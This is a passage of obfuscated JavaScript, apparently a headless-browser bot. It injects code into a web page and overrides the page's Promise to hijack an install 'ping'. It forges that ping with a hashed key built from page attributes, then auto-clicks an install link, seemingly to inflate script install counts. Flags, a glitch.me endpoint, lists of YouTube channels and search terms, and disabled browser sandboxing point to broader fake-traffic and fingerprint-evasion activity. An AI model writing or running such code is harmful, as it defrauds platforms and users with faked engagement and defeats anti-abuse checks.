                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x14bd * 0x1 + -0x37e + -0x113a | L >>> -0x1603 + -0x75d + 0x1d7b * 0x1) + (M & N | ~M & O) + P + (0xa0e7c99a + 0x9e0ce913 * -0x1 + 0x2bd3cc89 * 0x2) + Q[J] << 0x74d + 0x1d71 + -0x24be) << 0x1 * -0x33 + 0xb3b + -0xb03 | P >>> -0x8ef * 0x3 + -0x90b * -0x4 + -0x944 * 0x1) + (L & (M = M << 0x2 * 0xa1f + 0xd55 * -0x2 + 0x68a | M >>> 0x1 * -0x7fa + -0x1f * 0xbf + 0x1f1d) | ~L & N) + O + (0x6a5460da + 0x408e * -0x5603 + 0x5de8e69) + Q[J + (-0x1dbe + 0x4 * 0x90a + -0x669)] << 0x1 * -0x653 + -0x725 + 0x8 * 0x1af) << 0x7 * 0x2c8 + -0x1e8b + -0x11c * -0xa | O >>> 0x23a0 + 0x1f02 + -0x4287) + (P & (L = L << 0x701 + -0x7ec + 0x109 | L >>> -0x5 * -0x577 + 0x1c49 + 0x50e * -0xb) | ~P & M) + N + (0xa27780e3 + -0x1 * 0x23fe3e0a + -0x23f6c940) + Q[J + (-0x2001 + 0x31f + 0xac * 0x2b)] << 0x2cd * -0x1 + 0x4 * -0x1cc + 0x9fd) << -0x13f8 + -0x13d5 + 0x3 * 0xd46 | N >>> -0x11aa + -0x71d * 0x4 + 0x2e39) + (O & (P = P << 0x186d + -0x2457 + 0xc08 | P >>> -0x1 * -0x1357 + 0x223e + -0x3593) | ~O & L) + M + (0xa * 0x7994d8a + 0x9fb9eb5b + -0x91347926) + Q[J + (-0x1 * 0x1a50 + 0x11ba + 0x899)] << -0x1 * -0x2424 + -0x1 * 0x362 + -0x20c2) << -0xb6b * 0x2 + 0x21e * 0xb + -0x6f | M >>> 0x1549 + -0x1db9 + 0x88b) + (N & (O = O << -0x2 * -0xf74 + -0xb0b * -0x2 + 0x69c * -0x8 | O >>> -0x1340 + -0x2 * -0x99d + -0x4 * -0x2) | ~N & P) + L + (0xb7805a * 0x25 + -0x8 * -0x1ae1ed6 + 0x328bf5e7) + Q[J + (-0x2 * -0xfff + -0xf * 0x235 + 0x121)] << -0x1 * 0x2102 + 0x1187 + 0xf7b, N = N << 0x229f * -0x1 + 0xdac + 0x1511 | N >>> -0x578 + 0x77f + -0x2f * 0xb;
              for (; J < 0x1171 + 0xfb6 + -0x20ff; J += -0x275 * -0x1 + -0x20d + -0x21 * 0x3)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x19a6 + 0xe2 + -0x269 * 0xb | L >>> -0x52 * -0x3d + -0x644 * 0x3 + 0x1 * -0xa3) + (M ^ N ^ O) + P + (-0x2 * -0xd3ed717 + -0x2cbb7 * 0x4e43 + 0x12f295058) + Q[J] << 0xacd + 0xcac + -0x1779 * 0x1) << -0x18f9 + -0x1bd7 + -0x34d5 * -0x1 | P >>> -0x3f1 * 0x9 + -0x2576 + 0x1 * 0x490a) + (L ^ (M = M << -0x1 * 0x16db + -0xf41 + -0x2a * -0xe9 | M >>> 0x2 * -0xb0c + -0x25bc + 0x3bd6) ^ N) + O + (-0x6b5a510f + 0x71201fc7 + 0x69141ce9) + Q[J + (-0x2166 + 0x8 * 0x1b8 + 0x27 * 0x81)] << 0x25d3 + -0x908 + -0x1 * 0x1ccb) << 0x5 * 0x652 + -0x1f15 + 0x8 * -0x10 | O >>> 0x173c + 0x192 + -0x18b3) + (P ^ (L = L << -0x6 * 0x1f + 0x1cdc + -0x16 * 0x146 | L >>> -0x1b33 + 0x1e93 + 0x35e * -0x1) ^ M) + N + (-0x4770d64 + -0x4e186539 + 0x2 * 0x60b4af1f) + Q[J + (0x11 * 0x1e7 + 0x95 + -0x17f * 0x16)] << -0x1594 * -0x1 + 0x2 * -0xe2a + 0x6c * 0x10) << -0xf * -0x95 + -0x1572 + 0x2 * 0x65e | N >>> 0x1a19 + 0x75 * 0x4f + 0x2f5 * -0x15) + (O ^ (P = P << 0x67 * 0x49 + -0x22e7 + 0x5a6 | P >>> -0x1577 + -0xa68 + -0x1fe1 * -0x1) ^ L) + M + (0x1 * -0x50985592 + -0x239b60 * -0x199 + 0x868f04d3 * 0x1) + Q[J + (-0x1314 + -0x125c + 0x2573)] << 0x196 + 0x1934 + -0x1aca) << -0x7fa + -0x2c2 * 0x2 + 0x481 * 0x3 | M >>> -0x3f5 * -0x5 + 0x1b2c + -0x2eda) + (N ^ (O = O << -0x1a77 + -0x7 * -0x2da + -0x69f * -0x1 | O >>> 0x570 + -0x1f * -0x32 + -0x5 * 0x24c) ^ P) + L + (-0x9c7c24e2 + -0x572a637e + -0x1 * -0x162807401) + Q[J + (-0x1 * -0x23e8 + -0x1 * -0x1191 + -0x3575)] << -0x105b + 0x12fd * -0x1 + -0xae * -0x34, N = N << -0x11df + -0x2 * -0x87c + -0x57 * -0x3 | N >>> 0x1325 + -0xe * 0x1de + -0x1 * -0x701;
              for (; J < 0xa12 + -0x1f39 + -0x4b * -0x49; J += 0x95 * 0x3e + 0x2263 + 0x3 * -0x177c)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x221d * 0x1 + -0x1 * 0x2709 + -0x492b * -0x1 | L >>> 0x7ab + 0xd6f + -0x14ff) + (M & N | M & O | N & O) + P - (0xa7ee4dce + 0x49efda9b + -0x80f9e545) + Q[J] << 0x1c0f + 0x6a + 0xc5 * -0x25) << 0xae2 * -0x2 + -0x2509 * -0x1 + -0xf40 | P >>> -0x152b + -0x1389 + 0x28cf) + (L & (M = M << 0x1604 * 0x1 + 0x64d * 0x2 + -0x8 * 0x450 | M >>> 0x2ea * -0x8 + -0x2 * -0x386 + 0x1046 * 0x1) | L & N | M & N) + O - (-0x622c0b1e + 0x1896ac23 * 0x6 + -0x1969b56 * -0x28) + Q[J + (-0x442 + 0x25cb + 0x862 * -0x4)] << 0x1384 * -0x2 + -0x77b * -0x2 + 0x1812) << 0x14d * 0x1 + 0x3e3 * -0x2 + 0x67e | O >>> -0x715 * -0x3 + 0x259a + 0x2 * -0x1d5f) + (P & (L = L << 0x649 * 0x2 + -0x18eb + 0xc77 * 0x1 | L >>> -0x8 * -0xe8 + 0x26bc + -0xd6 * 0x37) | P & M | L & M) + N - (-0x11 * -0xabe055e + -0x382ea6f + 0x42372dab * -0x1) + Q[J + (0x24c5 + 0x10f6 + 0x329 * -0x11)] << 0x1 * -0xf0d + -0x20e0 + 0x2fed) << 0x579 * -0x2 + -0x20b9 + 0x576 * 0x8 | N >>> -0x1ec2 + -0xbb7 + 0x884 * 0x5) + (O & (P = P << -0x1668 + 0x47 * -0x5b + 0x2fc3 | P >>> -0x201 * 0xf + 0xb * -0x99 + 0x24a4) | O & L | P & L) + M - (0x2b3120c5 + 0x67 * 0x62621a + -0x49 * -0x699ca1) + Q[J + (0x3 * -0xadf + 0x69e + 0x1a02)] << 0x1c31 + 0x1074 + -0x2ca5) << 0x809 * -0x2 + 0x1bd5 + -0xbbe | M >>> 0x70 + -0x74f * 0x1 + 0x6fa) + (N & (O = O << -0x2376 + 0x65c + 0x1d38 | O >>> 0x3 * -0x513 + -0x649 * 0x1 + -0x72c * -0x3) | N & P | O & P) + L - (0x5c3f629 * 0x1f + -0x5f0508b3 + 0xb * 0x2a722a0) + Q[J + (0xc4c + -0x104e + 0x406)] << 0x1627 * 0x1 + 0x2 * -0x12b2 + 0xf3d, N = N << -0x1a7a + 0xb2 * 0xe + 0x10dc | N >>> 0x2b * -0x97 + -0x4 * -0x1fc + 0x116f;
              for (; J < 0x370 + 0x2450 + -0x2770; J += -0x20db * 0x1 + 0x1 * -0x251 + 0x3 * 0xbbb)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x6 * 0x44f + -0x1f85 + 0x38 * 0x1a | L >>> -0x98 + 0x2b6 * -0xd + -0x3 * -0xbfb) + (M ^ N ^ O) + P - (0x93 * 0x268003 + -0x1 * 0x479155d9 + 0x6713124a) + Q[J] << -0x2b * 0x7d + 0x124 * -0x10 + 0x273f) << -0x3 * 0xab + -0xb6 + 0x4 * 0xaf | P >>> 0x5f * -0x37 + -0x17fc + 0x2c80) + (L ^ (M = M << 0x72f * -0x3 + -0x60b + 0x1bb6 | M >>> 0x187f + -0x1484 * -0x1 + -0x2d01) ^ N) + O - (0x1b9e0932 + -0x4bc924d * -0x16 + -0xa * 0x7d222f7) + Q[J + (-0x2e * -0x3 + -0x2 * -0x264 + 0x1 * -0x551)] << 0x81 * 0x1 + 0x3e2 + -0x1 * 0x463) << -0x19 + 0x6c5 * -0x1 + -0x2b * -0x29 | O >>> -0x22ba + 0x6d * 0x17 + 0x1 * 0x190a) + (P ^ (L = L << -0x1bdb * 0x1 + -0xb * -0x1e7 + 0xa4 * 0xb | L >>> -0x1c * -0xef + 0x1e9a * -0x1 + 0x2c * 0x1a) ^ M) + N - (-0x63549775 + -0x20cb852e + 0xb9bd5acd) + Q[J + (0x1b3f + 0x1 * -0x4a9 + -0x55 * 0x44)] << 0x75 + -0x2368 + 0x22f3) << 0x18da + -0x5c4 + -0x1311 | N >>> -0x9 * 0x183 + -0x951 + 0x83 * 0x2d) + (O ^ (P = P << 0x26f + 0x1ebf + -0x2110 | P >>> -0xd13 + 0xc1 * -0x1b + -0x10b8 * -0x2) ^ L) + M - (0x5a30a3c8 + 0xa6e13 * -0x661 + 0x1df4c195) + Q[J + (0x1b84 + -0x1193 + -0x9ee)] << -0x100 + -0x2327 + 0x2427) << 0x1306 + 0x5b * 0x43 + -0x2ad2 | M >>> -0xf9d + -0x1183 * -0x1 + -0x1b * 0x11) + (N ^ (O = O << -0x3d9 + 0x7d2 + -0x3db | O >>> -0x51b * 0x5 + -0x1bd0 + 0x3559) ^ P) + L - (0x20ab8056 + -0x5e451ef6 * 0x1 + 0x7336dcca) + Q[J + (0x1 * 0xed7 + 0x1 * 0x162a + -0x24fd)] << 0xe6b + 0x141 + -0x7d6 * 0x2, N = N << -0x7c9 * 0x2 + -0x1 * 0x1c4b + 0x8b * 0x51 | N >>> -0xd5c + 0x3bc * 0x6 + -0x90a;
              this['h0'] = this['h0'] + L << 0xc59 + -0xdc6 + -0x16d * -0x1, this['h1'] = this['h1'] + M << -0x1513 + 0xd * 0x5 + 0x14d2, this['h2'] = this['h2'] + N << 0x277 * 0xc + -0x1d65 + -0x2f, this['h3'] = this['h3'] + O << -0x2371 + -0xf34 + 0xa21 * 0x5, this['h4'] = this['h4'] + P << -0x53 * -0x13 + -0x1207 + -0x31 * -0x3e;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x20ba + -0x87 * 0x37 + 0x3dd7 & -0x1 * 0x98f + -0x11 * 0x163 + 0x2131] + w[J >> -0xf58 + 0x3ce * -0x8 + 0x2de0 & 0x1 * 0x4af + 0x15 * -0xf + -0x365] + w[J >> 0x18ef + 0x2265 + -0x3b40 & -0x1af * 0xf + -0x13 * -0x171 + -0x213] + w[J >> -0x2340 + 0x235 + -0x5 * -0x69f & -0x1 * 0x1492 + -0x38c + 0x80f * 0x3] + w[J >> -0x1 * -0x2039 + -0x1d3f + -0x2ee & 0x15b3 + -0x5 * -0x67d + 0x429 * -0xd] + w[J >> -0x1685 + -0xc27 + 0x22b4 & -0x10fa + 0x1a91 + -0x988] + w[J >> 0x25 * 0x82 + -0x1 * 0x2687 + 0x13c1 & 0x74e + -0x3 * -0x1c5 + -0xc8e] + w[-0x49d * -0x7 + 0x37d + -0x23b9 & J] + w[K >> -0x6d * -0x20 + -0x1 * 0x1d75 + 0xff1 & -0xbf5 + -0x1da9 * -0x1 + 0x1 * -0x11a5] + w[K >> -0x103e + 0x66e + -0x27a * -0x4 & -0x8cd * 0x1 + 0x1 * -0x1e91 + -0x1 * -0x276d] + w[K >> -0x1cf + -0x1 * -0x2f9 + -0x116 & 0x26c0 + -0x226c + -0x445] + w[K >> -0x20c3 + 0x1 * 0x4d5 + -0x2 * -0xdff & 0x150 * -0x10 + 0x1 * -0x13f3 + -0x1481 * -0x2] + w[K >> -0x1bda + 0x1ffc + 0x1 * -0x416 & -0xcd4 + -0x1f95 + 0x8 * 0x58f] + w[K >> -0x5 * -0x5a1 + 0x1d2 * -0xc + -0x5 * 0x141 & -0xc44 + -0x68e + 0x12e1] + w[K >> 0x1b * 0x8d + 0x1620 + -0x1 * 0x24fb & -0x1178 + 0x20a9 + -0xf22] + w[-0x1f19 + 0x1641 + 0x8e7 & K] + w[L >> 0x536 + 0x725 + -0xa5 * 0x13 & -0xa * -0xe6 + 0xc95 * -0x1 + -0xd * -0x48] + w[L >> -0x6 * -0x9d + -0x1ec2 + -0x5e * -0x4a & 0x62d + -0x4 * 0x5cb + 0x887 * 0x2] + w[L >> 0x674 + 0x3 * -0x27d + -0x117 * -0x1 & 0x8f4 + -0x1 * 0xa0f + -0x95 * -0x2] + w[L >> -0x22b4 * 0x1 + 0x1944 + 0x980 & -0x2 * -0xe26 + -0x5 * -0xfe + -0x3 * 0xb11] + w[L >> -0x808 * -0x1 + 0x6 * -0x485 + 0x1322 & 0xcb3 + -0x229 * 0xd + 0xf71] + w[L >> -0x11df + -0x1122 + 0x2309 * 0x1 & -0x14d5 + -0xd2d + 0x2211] + w[L >> -0x5fa * 0x3 + 0xc1 * 0x13 + 0x39f & 0x10a4 + 0x1d36 + -0x2dcb] + w[0x22af + -0x2 * 0x4d1 + -0x18fe & L] + w[M >> 0x709 + -0x8 * -0x2c + -0x1 * 0x84d & -0x31 * 0x29 + 0x4ea + -0x1 * -0x2fe] + w[M >> -0xc9 * 0x9 + -0x1b * -0x82 + 0x1 * -0x68d & 0xd88 + 0xf * -0x29 + -0xd * 0xda] + w[M >> 0x8 * -0x2f2 + -0x6df * 0x1 + -0x1e83 * -0x1 & 0x1 * 0x2140 + -0x1 * -0x1857 + -0x3988] + w[M >> 0x150b + 0x19ec + 0x1 * -0x2ee7 & -0x713 + -0xfc1 + 0x16e3] + w[M >> 0x282 + -0x23ba + -0x2 * -0x10a2 & 0x73 + 0x1859 + -0x18bd] + w[M >> 0x1034 + 0x1 * 0x4b7 + 0x14e3 * -0x1 & 0x845 * -0x4 + 0x22b3 + -0x190] + w[M >> -0x116 * 0x1d + -0x1064 + 0x2fe6 & -0xca5 + -0x78b * -0x3 + 0x4d * -0x21] + w[0x51c + 0x1 * -0xe00 + 0x8f3 & M] + w[N >> -0x274 * -0x4 + 0x1e4c + -0x2800 & 0x2 * 0x343 + -0x531 * -0x7 + 0x2ace * -0x1] + w[N >> -0x13ef + 0x1a4d * 0x1 + -0x646 & -0x2692 + -0x1 * 0x1ea6 + -0xddb * -0x5] + w[N >> 0x1ff5 + -0x1ca8 + -0x5 * 0xa5 & 0x22af + -0x2441 + 0x1a1] + w[N >> -0x1fcb + 0x309 + 0x1cd2 & -0x180e + 0x23 * -0xe3 + -0x27 * -0x16a] + w[N >> 0x1951 * -0x1 + 0xb91 + 0x1 * 0xdcc & 0x1b * 0x151 + 0xef * -0x27 + 0xed] + w[N >> -0x1309 + 0x2b * -0x79 + -0x2764 * -0x1 & -0x8e * -0x1 + -0x6fa + 0x15 * 0x4f] + w[N >> -0xd9b * 0x1 + -0x8a1 + 0x1640 & 0x4 * 0x368 + 0x11 * -0x12b + 0x64a] + w[0x16fa + 0x1efd * 0x1 + -0x35e8 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x1ddb + -0x1fa1 + 0x1de & 0x1 * -0x16e1 + 0x1 * -0x2069 + 0x3849,
                J >> -0x1 * 0x1c83 + -0x1b * 0xb + 0x1dbc & -0x245f + 0x1 * 0x17e5 + 0x1 * 0xd79,
                J >> 0x1 * 0x1d14 + -0x1da + -0x1b32 & 0x1839 + -0xa46 + -0xcf4,
                0x16 * -0xbc + -0xb9d * 0x3 + 0x33fe & J,
                K >> 0xa * -0x6b + 0x1a66 + -0x76 * 0x30 & 0x15bb * -0x1 + -0x1 * -0x2550 + -0x74b * 0x2,
                K >> 0x246 * -0x7 + 0x258d * -0x1 + -0x3587 * -0x1 & -0x3f3 * -0x2 + -0x11e6 + 0xaff * 0x1,
                K >> 0x1f4f + 0xa61 * 0x3 + -0x3e6a & -0x97 * -0x16 + 0x1edd + 0x2ad8 * -0x1,
                -0x6f6 + 0xc07 * 0x1 + -0x412 * 0x1 & K,
                L >> 0x59e + -0x40 * 0x73 + 0x173a & -0x1b57 * 0x1 + -0x1e8 * 0x8 + 0x2b96,
                L >> 0x17a + 0x1 * 0x8bb + 0x1 * -0xa25 & 0x1004 + 0x7f1 + -0x16f6,
                L >> 0x2088 + -0x789 * 0x3 + -0x9e5 & 0x15d9 + -0xc6 + -0x1414,
                0x1 * 0xef + -0xff3 + -0x1 * -0x1003 & L,
                M >> 0x2642 + 0x267a + 0x1 * -0x4ca4 & 0x17c6 + 0x146 + -0x180d,
                M >> 0x28b + 0x25d7 * 0x1 + -0x2852 & 0x18b3 + -0x13a7 + -0x40d,
                M >> -0x1 * 0x1fe6 + 0x18d3 * 0x1 + 0x71b & 0x17ae + 0xa4b + -0x20fa,
                0x178e + -0x2 * 0x817 + 0x47 * -0x17 & M,
                N >> -0x22c2 + 0x1 * -0x18ee + -0x1de4 * -0x2 & 0x1def + 0x90f + 0x47 * -0x89,
                N >> -0x5 * 0x305 + -0x1 * -0x14c2 + -0x599 & -0x2405 + 0x59 * -0x31 + 0x360d,
                N >> 0xe1 * 0x7 + 0x18af + -0x1ece & 0xad8 + 0x218b * -0x1 + 0x17b2,
                0xac9 * -0x3 + 0x47 * 0x34 + -0x2 * -0x977 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x952 + -0x9a5 + 0x659 * 0x3), (K = new DataView(J))['setUint32'](0x965 + -0x1 * 0x14dc + 0xb77, this['h0']), K['setUint32'](-0x23 * -0x82 + -0x6e * 0x49 + 0xd9c, this['h1']), K['setUint32'](0x655 * 0x2 + -0x1d15 * -0x1 + 0x1 * -0x29b7, this['h2']), K['setUint32'](-0xea1 + 0x1d87 * 0x1 + 0xeda * -0x1, this['h3']), K['setUint32'](-0x1bba + -0x103f + 0x2c09 * 0x1, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype'][U(0x13, 'OaSa')] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x257 * 0x5 + -0x259 * 0xd + 0x12d2];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x127 * 0x7 + -0xbc8 + 0x13d9;
            J[-0x23f4 + -0xa6d + -0x1f * -0x17f]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0xa15 + -0x17b6 + 0x21cb] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x2 * 0x91a + 0xc6d * -0x1 + -0x5c6), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x1 * -0x266e + -0x13c0 + 0x2ab * -0x7;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0x8df * 0x1 + -0x2423 + 0x2120), Promise['resolve'](-0x2 * -0xbd3 + 0x128b + -0x2a30);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r[V(0x11)](), i())) : (await s[V(0x11)](), await r['close'](), i());
    }
  }
  for (let j = 0x1 * 0x1f01 + 0x2 * 0x1b3 + 0x1 * -0x2267; j < 0x250e + 0x5d5 * 0x6 + 0x480b * -0x1; j++)
    i();
}
const NETWORK_PATIENCE = 0x3532 + 0x141d * -0x2 + -0x14 * -0xea + (-0x16a2 + 0x41a + 0x1e40) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x11 * 0x145 + 0x6 * 0x3e6 + -0x5 * 0x5c) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + W(0xd) + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x1 * -0xf43 + 0x1 * 0x1809 + -0x2 * 0x463; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x1edf + 0x1162 + 0xd7d);
    let h = e[f];
    if (c['LPudKt'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x3 * -0x771 + 0x1 * 0x1c8b + 0xc7 * -0x8, r, s, t = 0x12a * -0x4 + -0x1 * 0x1cae + 0x22 * 0xfb; s = m['charAt'](t++); ~s && (r = q % (-0x9 * -0x111 + -0x181a + 0xe85) ? r * (0x2066 + -0x1bd7 + 0x44f * -0x1) + s : s, q++ % (0x1 * -0x469 + 0xa6b + -0x5fe)) ? o += String['fromCharCode'](-0xe33 + 0x19e5 + 0x21 * -0x53 & r >> (-(-0xaaf * -0x2 + -0xdab + -0x7b1) * q & -0x1 * 0x18ab + -0x1 * -0x1d0a + -0x15 * 0x35)) : 0x25f4 * -0x1 + 0x1 * -0x23d5 + -0x5ad * -0xd) {
          s = n['indexOf'](s);
        }
        for (let u = 0x1 * 0x160b + 0x1936 + 0x2f41 * -0x1, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x1 * -0x1261 + 0x7 * -0x377 + -0x130 * -0x5))['slice'](-(-0x1154 + 0x7 * 0x4c5 + -0x100d));
        }
        return decodeURIComponent(p);
      };
      c['oueppo'] = i, b = arguments, c['LPudKt'] = !![];
    }
    const j = e[-0x1d * -0xae + 0x99f * 0x3 + -0x1 * 0x3093],
      k = f + j,
      l = b[k];
    return !l ? (h = c['oueppo'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x1e6a + -0x25dd * 0x1 + 0x1 * 0x4451)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x102f + -0x1376 + -0x1 * -0x351)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 